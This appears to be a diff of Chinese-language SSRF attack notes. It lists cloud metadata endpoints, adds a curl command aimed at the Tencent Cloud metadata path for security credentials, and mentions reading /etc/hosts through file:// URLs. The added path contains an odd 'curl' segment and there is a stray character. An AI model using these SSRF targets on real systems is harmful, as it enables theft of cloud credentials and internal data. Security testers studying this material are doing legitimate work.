@@ -27,10 +27,16 @@ http://metadata.tencentyun.com/latest/meta-data/
 http://169.254.169.254/
 http://169.254.169.254/latest/meta-data/instance-id
 ```
-云ssrf：<https://cloud.tencent.com/developer/article/1968655?areaSource=105001.3&traceId=FyZTpLc2ixMvGwJf2-pDn>
+云ssrf：
+<https://cloud.tencent.com/developer/article/1968655?areaSource=105001.3&traceId=FyZTpLc2ixMvGwJf2-pDn>
+
+腾讯文档：
+<https://cloud.tencent.com/document/product/213/4934#.E6.A3.80.E7.B4.A2E7.94.A8.E6.88.B7.E6.95.B0.E6.8D.AE>
+![](.topwrite/assets/image_1742705365696.png)
+curl http://metadata.tencentyun.com/latest/meta-data/cam/curl/security-credentials
 
 
-
+^
 file:
 ```
     访问本地文件，file:///etc/hosts 查看本机内网ip
